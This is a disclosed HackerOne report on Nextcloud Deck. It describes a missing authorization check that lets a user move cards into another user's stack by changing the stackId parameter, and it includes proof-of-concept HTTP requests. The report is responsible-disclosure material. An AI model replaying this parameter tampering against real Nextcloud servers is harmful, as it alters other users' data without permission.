# Access Control: Inject tasks into other users decks

## Report Details
- **Report ID**: 867052
- **URL**: https://hackerone.com/reports/867052
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-06T09:00:48.648Z
- **Disclosed**: 2021-02-02T13:20:48.931Z

## Reporter
- **Username**: dedoc
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
When moving a task to another deck a request is made to /apps/deck/cards/XXXX. in the request the destination stackId parameter is used. When a user changes the parameter to that of a stack not belonging to him the task is still added.

### PoC

Create a card:
```
POST /apps/deck/cards HTTP/1.1
[...]

{"title":"SOME_TEST","stackId":1,"type":"plain"}
```
Move the Card:
```
PUT /apps/deck/cards/13 HTTP/1.1
[...]

{"title":"SOME_TEST","description":"","stackId":2,"type":"plain","lastModified":1588755341,"lastEditor":null,"createdAt":1588755341,"labels":null,"assignedUsers":null,"attachments":null,"attachmentCount":null,"owner":"test1","order":999,"archived":false,"duedate":null,"deletedAt":0,"commentsUnread":0,"id":13,"overdue":0}
```

When now intercepting and changing the `stackId` to `6` (that of another user) the server responds with a `200 OK` and the card is added to the stack of the receiving user.

## Impact

Deck of other users can be polluted.  Missing authorization check.

## Attachments
No attachments
